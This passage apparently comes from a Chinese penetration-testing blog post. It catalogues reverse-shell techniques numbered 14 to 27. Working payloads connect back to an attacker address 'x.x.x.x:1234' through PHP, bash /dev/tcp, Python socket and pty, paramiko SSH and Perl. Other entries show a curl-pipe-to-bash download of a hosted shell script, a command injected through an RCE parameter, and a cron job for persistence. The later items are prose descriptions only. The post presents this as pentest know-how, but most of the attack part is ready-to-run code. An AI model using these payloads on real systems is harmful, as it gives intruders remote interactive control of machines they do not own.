+<h3 id="14-使用Web服务器"><a href="#14-使用Web服务器" class="headerlink" title="14. 使用Web服务器"></a>14. 使用Web服务器</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip=&#x27;x.x.x.x&#x27;;// 攻击者IP</span><br><span class="line">$port=1234;// 监听端口</span><br><span class="line">$sock=fsockopen($ip,$port);</span><br><span class="line">$proc=proc_open(&#x27;/bin/bash -i&#x27;,array(0=&gt;$sock,1=&gt;$sock,2=&gt;$sock),$pipes);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="15-利用系统工具（如curl或wget）"><a href="#15-利用系统工具（如curl或wget）" class="headerlink" title="15. 利用系统工具（如curl或wget）"></a>15. 利用系统工具（如curl或wget）</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 在攻击者机器上创建一个简单的bash反弹shell脚本，并将其托管在Web服务器上</span><br><span class="line">echo &#x27;bash -i &gt;&amp; /dev/tcp/x.x.x.x/1234 0&gt;&amp;1&#x27; &gt; reverse_shell.sh</span><br><span class="line">python3 -m http.server 80  # 使用Python的HTTP服务器托管脚本</span><br><span class="line"># 在目标机器上执行curl命令下载并执行反弹shell脚本</span><br><span class="line">curl http://x.x.x.x/reverse_shell.sh | bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="16-利用漏洞（如远程代码执行漏洞）"><a href="#16-利用漏洞（如远程代码执行漏洞）" class="headerlink" title="16. 利用漏洞（如远程代码执行漏洞）"></a>16. 利用漏洞（如远程代码执行漏洞）</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 假设目标系统有一个RCE漏洞，可以通过URL参数执行任意命令</span><br><span class="line"># 例如：http://target.com/vulnerable_page.php?cmd=whoami</span><br><span class="line"># 构造反弹shell命令并通过RCE漏洞执行</span><br><span class="line">curl &quot;http://target.com/vulnerable_page.php?cmd=bash+-i+&gt;&amp;+/dev/tcp/x.x.x.x/1234+0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="17-自定义脚本"><a href="#17-自定义脚本" class="headerlink" title="17. 自定义脚本"></a>17. 自定义脚本</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">host =&#x27;x.x.x.x&#x27;# 攻击者IP</span><br><span class="line">port =1234# 监听端口</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">os.dup2(s.fileno(),0)# stdin</span><br><span class="line">os.dup2(s.fileno(),1)# stdout</span><br><span class="line">os.dup2(s.fileno(),2)# stderr</span><br><span class="line">os.system(&#x27;/bin/bash -i&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="18-使用Python的pty库模拟终端"><a href="#18-使用Python的pty库模拟终端" class="headerlink" title="18. 使用Python的pty库模拟终端"></a>18. 使用Python的<code>pty</code>库模拟终端</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pty</span><br><span class="line">import socket</span><br><span class="line">host =&#x27;x.x.x.x&#x27;</span><br><span class="line">port =1234</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line"># 使用pty模拟终端</span><br><span class="line">master, slave = pty.openpty()</span><br><span class="line">os.dup2(slave.fileno(),0)</span><br><span class="line">os.dup2(slave.fileno(),1)</span><br><span class="line">os.dup2(slave.fileno(),2)</span><br><span class="line">os.execvp(&#x27;/bin/bash&#x27;,[&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])</span><br><span class="line"># 注意：在实际使用中，可能需要在攻击者端使用类似screen或tmux的工具来管理pty会话</span><br></pre></td></tr></table></figure>
+
+<h3 id="19-利用Python的paramiko库进行SSH反弹"><a href="#19-利用Python的paramiko库进行SSH反弹" class="headerlink" title="19. 利用Python的paramiko库进行SSH反弹"></a>19. 利用Python的<code>paramiko</code>库进行SSH反弹</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import paramiko</span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line"># 攻击者端设置SSH服务器监听</span><br><span class="line"># 需要一个外部的SSH服务器或者使用Python的SSH库（如paramiko的ServerInterface）来模拟</span><br><span class="line"># 这里假设已经有一个SSH服务器在监听</span><br><span class="line"># 目标端执行以下Python代码</span><br><span class="line">hostname =&#x27;x.x.x.x&#x27;# 攻击者SSH服务器IP</span><br><span class="line">port =22</span><br><span class="line">username =&#x27;attacker_user&#x27;</span><br><span class="line">password =&#x27;attacker_password&#x27;</span><br><span class="line">client = paramiko.SSHClient()</span><br><span class="line">client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">client.connect(hostname, port, username, password)</span><br><span class="line"># 开启一个反向隧道</span><br><span class="line">transport = client.get_transport()</span><br><span class="line">chan = transport.open_session()</span><br><span class="line">chan.invoke_shell()</span><br><span class="line"># 将标准输入、输出和错误输出重定向到该SSH会话</span><br><span class="line">os.dup2(chan.makefile(&#x27;wb&#x27;,-1).fileno(),1)</span><br><span class="line">os.dup2(chan.makefile(&#x27;rb&#x27;,-1).fileno(),0)</span><br><span class="line">os.dup2(chan.makefile_stderr(&#x27;rb&#x27;,-1).fileno(),2)</span><br><span class="line"># 启动bash shell</span><br><span class="line">os.execvp(&#x27;/bin/bash&#x27;,[&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])</span><br></pre></td></tr></table></figure>
+
+<h3 id="20-使用Perl的IO-Socket模块"><a href="#20-使用Perl的IO-Socket模块" class="headerlink" title="20. 使用Perl的IO::Socket模块"></a>20. 使用Perl的<code>IO::Socket</code>模块</h3><p>Perl的<code>IO::Socket</code>模块可以用于创建网络连接，从而实现反弹shell。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/perl -w</span><br><span class="line">use strict;</span><br><span class="line">use IO::Socket::INET;</span><br><span class="line">my $remote_ip =&#x27;x.x.x.x&#x27;;# 攻击者IP</span><br><span class="line">my $remote_port =1234;# 监听端口</span><br><span class="line">my $sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $remote_ip,PeerPort =&gt; $remote_port,Proto =&gt;&#x27;tcp&#x27;);</span><br><span class="line">die&quot;Could not create socket: $!\n&quot;unless $sock;</span><br><span class="line"># 将标准输入、输出和错误输出重定向到socket</span><br><span class="line">open STDIN,&quot;&gt;&amp;=$sock&quot;;</span><br><span class="line">open STDOUT,&quot;&gt;&amp;=$sock&quot;;</span><br><span class="line">open STDERR,&quot;&gt;&amp;=$sock&quot;;</span><br><span class="line"># 启动shell</span><br><span class="line">exec(&quot;/bin/bash -i&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="21-利用Java的JSch库进行SSH反弹（类似paramiko）"><a href="#21-利用Java的JSch库进行SSH反弹（类似paramiko）" class="headerlink" title="21. 利用Java的JSch库进行SSH反弹（类似paramiko）"></a>21. 利用Java的<code>JSch</code>库进行SSH反弹（类似paramiko）</h3><p><code>JSch</code>是一个Java实现的SSH2库，可以用于创建SSH连接。如果目标系统允许SSH连接，并且攻击者拥有凭据，那么可以使用<code>JSch</code>进行SSH反弹。</p>
+<p>因为涉及的内容较多，包括设置SSH服务器、处理认证等，不再给出完整的Java代码示例。但基本思路是：在攻击者端设置一个SSH服务器，然后在目标端使用<code>JSch</code>库连接到该服务器，并开启一个反向隧道。</p>
+<h3 id="22-使用Ruby的drb（Distributed-Ruby）进行反弹"><a href="#22-使用Ruby的drb（Distributed-Ruby）进行反弹" class="headerlink" title="22. 使用Ruby的drb（Distributed Ruby）进行反弹"></a>22. 使用Ruby的<code>drb</code>（Distributed Ruby）进行反弹</h3><p>Ruby的<code>drb</code>（Distributed Ruby）可以用于创建分布式对象系统。虽然不常用于反弹shell，但在某些场景下可能是一个有趣的选择。</p>
+<p><strong>注意</strong>：由于<code>drb</code>不是专门用于反弹shell的，因此实现起来可能比较复杂，并且需要攻击者设置一个DRuby服务器。</p>
+<h3 id="23-利用目标系统的计划任务或cron作业"><a href="#23-利用目标系统的计划任务或cron作业" class="headerlink" title="23. 利用目标系统的计划任务或cron作业"></a>23. 利用目标系统的计划任务或cron作业</h3><p>如果攻击者能够在目标系统上添加计划任务或cron作业，那么可以设置一个任务来执行反弹shell命令。</p>
+<p>例如，在Linux系统上，可以使用<code>crontab -e</code>来添加一个定时任务：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/x.x.x.x/1234 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>：这种方法需要攻击者具有在目标系统上添加计划任务或cron作业的权限。</p>
+<h3 id="24-使用目标系统的服务或守护进程"><a href="#24-使用目标系统的服务或守护进程" class="headerlink" title="24. 使用目标系统的服务或守护进程"></a>24. 使用目标系统的服务或守护进程</h3><p>某些服务或守护进程可能允许攻击者配置外部命令或脚本的执行。攻击者可以利用这些服务来执行反弹shell命令。</p>
+<p>例如，某些Web服务器允许在配置文件中指定错误处理脚本。攻击者可以修改这些配置文件，使其在发生错误时执行反弹shell命令。</p>
+<p><strong>注意</strong>：这种方法需要攻击者具有修改目标系统服务或守护进程配置的权限。</p>
+<h3 id="25-利用目标系统的漏洞利用工具集"><a href="#25-利用目标系统的漏洞利用工具集" class="headerlink" title="25. 利用目标系统的漏洞利用工具集"></a>25. 利用目标系统的漏洞利用工具集</h3><p>许多漏洞利用工具集（如Metasploit Framework）提供了自动化的反弹shell功能。攻击者可以使用这些工具集来利用目标系统的已知漏洞，并自动执行反弹shell命令。</p>
+<p><strong>注意</strong>：使用漏洞利用工具集需要攻击者对目标系统的漏洞有深入的了解，并且需要确保所使用的工具集是最新且安全的。</p>
+<h3 id="26-使用目标系统的内置脚本语言（如Python、Perl等）的Web接口"><a href="#26-使用目标系统的内置脚本语言（如Python、Perl等）的Web接口" class="headerlink" title="26. 使用目标系统的内置脚本语言（如Python、Perl等）的Web接口"></a>26. 使用目标系统的内置脚本语言（如Python、Perl等）的Web接口</h3><p>如果目标系统提供了内置脚本语言（如Python、Perl等）的Web接口（如CGI、FastCGI等），攻击者可能可以利用这些接口来执行反弹shell命令。</p>
+<p>例如，攻击者可以上传一个包含反弹shell代码的CGI脚本，并通过Web浏览器访问该脚本来触发反弹shell。</p>
+<p><strong>注意</strong>：这种方法需要攻击者能够上传并执行Web脚本，并且目标系统需要允许这些脚本语言的Web接口。</p>
+<h3 id="27-利用目标系统的远程桌面协议（如RDP、VNC等）的反向连接功能"><a href="#27-利用目标系统的远程桌面协议（如RDP、VNC等）的反向连接功能" class="headerlink" title="27. 利用目标系统的远程桌面协议（如RDP、VNC等）的反向连接功能"></a>27. 利用目标系统的远程桌面协议（如RDP、VNC等）的反向连接功能</h3><p>某些远程桌面协议（如RDP、VNC等）允许反向连接，即目标系统主动连接到攻击者的机器。攻击者可以配置这些协议以使用反向连接模式，并在目标系统上启动远程桌面客户端来建立连接。</p>
+<p><strong>注意</strong>：这种方法需要攻击者具有在目标系统上启动远程桌面客户端的权限，并且目标系统需要支持反向连接功能。</p>
+<p><strong>反弹shell是渗透测试中不可或缺的技术之一，允许攻击者获得对目标系统的交互式访问权限，网络安全从业者需要掌握且擅长，能根据不同的场景来使用不同的反弹shell姿势。</strong></p>
+<h3 id="aspx-ascx-ashx"><a href="#aspx-ascx-ashx" class="headerlink" title="aspx,ascx,ashx"></a>aspx,ascx,ashx</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/liangmengbk/article/details/92562585">https://blog.csdn.net/liangmengbk/article/details/92562585</a></li>
+</ul>
+<p>ascx</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-061744">https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-061744</a></li>
+</ul>
+<p>Asmx</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/178010.html">https://www.freebuf.com/articles/web/178010.html</a></li>
+</ul>
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2021/09/09/security-architecture/future-security-protection/">未来的网络安全防护，凡我不能仿真的，我就不能防御</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2021/06/09/security-architecture/singapore-security-compliance/">新加坡云服务安全合规概览</a></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@anonymity</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
